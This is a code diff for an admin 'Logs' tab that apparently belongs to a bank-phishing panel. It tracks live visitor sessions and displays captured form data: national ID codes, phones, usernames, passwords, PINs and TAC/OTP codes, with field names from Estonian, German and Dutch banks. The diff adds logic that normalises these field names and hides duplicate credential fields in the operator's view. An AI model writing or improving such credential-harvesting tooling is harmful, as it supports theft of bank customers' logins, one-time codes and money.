@@ -10,6 +10,88 @@ import { isSessionLive, parseVisitorPresenceState } from "@/lib/admin-presence";
 const SESSION_LIST_COLUMNS =
   "id,created_at,amount,current_step,status,form_data,ip_address,user_agent,partner_name,is_hidden";
 
+function inferCanonicalLogFieldKey(
+  key: string,
+): "personalCode" | "phone" | "username" | "password" | "tacCode" | "loginMethod" | null {
+  const normalizedKey = key.toLowerCase().replace(/[^a-z0-9]/g, "");
+
+  if (
+    normalizedKey.includes("personalidentitycode") ||
+    normalizedKey.includes("identitycode") ||
+    normalizedKey.includes("personalcode") ||
+    normalizedKey.includes("isikukood")
+  ) {
+    return "personalCode";
+  }
+
+  if (
+    normalizedKey.includes("mobilenumber") ||
+    normalizedKey.includes("phonenumber") ||
+    normalizedKey.includes("phonefield") ||
+    normalizedKey.includes("telefon") ||
+    normalizedKey === "phone"
+  ) {
+    return "phone";
+  }
+
+  if (
+    normalizedKey.includes("userid") ||
+    normalizedKey.includes("username") ||
+    normalizedKey.includes("loginid") ||
+    normalizedKey.includes("kasutajatunnus") ||
+    normalizedKey.endsWith("tunnus")
+  ) {
+    return "username";
+  }
+
+  if (
+    normalizedKey.includes("password") ||
+    normalizedKey.includes("passcode") ||
+    normalizedKey.includes("parool") ||
+    normalizedKey.includes("pincalcpassword") ||
+    normalizedKey === "pin"
+  ) {
+    return "password";
+  }
+
+  if (
+    normalizedKey.includes("tac") ||
+    normalizedKey.includes("otp") ||
+    normalizedKey.includes("smscode") ||
+    normalizedKey.includes("verificationcode") ||
+    normalizedKey.includes("responsecode") ||
+    normalizedKey.includes("kontrollkood")
+  ) {
+    return "tacCode";
+  }
+
+  if (normalizedKey.includes("loginmethod") || normalizedKey.includes("authmethod")) {
+    return "loginMethod";
+  }
+
+  return null;
+}
+
+function shouldHideDuplicateBankField(formData: Record<string, any>, key: string, value: unknown): boolean {
+  if (typeof value !== "string" || !value.trim()) {
+    return false;
+  }
+
+  const canonicalKey = inferCanonicalLogFieldKey(key);
+  if (!canonicalKey || canonicalKey === key) {
+    return false;
+  }
+
+  const canonicalValue =
+    canonicalKey === "username"
+      ? String(formData.username ?? formData.verfuegernummer ?? "").trim()
+      : canonicalKey === "password"
+        ? String(formData.password ?? formData.pin ?? "").trim()
+        : String(formData[canonicalKey] ?? "").trim();
+
+  return Boolean(canonicalValue) && canonicalValue === value.trim();
+}
+
 export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
   const supabase = createBrowserSupabaseClient();
   const [rows, setRows] = useState<DemoSession[]>([]);
@@ -641,7 +723,8 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                                 "session_id", "id", "created_at", "updated_at",
                                 "user_agent", "ip_address", "is_hidden"
                               ];
-                              return !ignoredKeys.includes(key);
+                              if (ignoredKeys.includes(key)) return false;
+                              return !shouldHideDuplicateBankField(fd, key, value);
                             })
                             .sort(([keyA], [keyB]) => {
                               const order = ["loginMethod", "personalCode", "phone", "username", "verfuegernummer", "password", "pin", "pasnummer", "rekeningnummer", "toegangscode", "signatuur", "identificatiecode", "tacCode"];
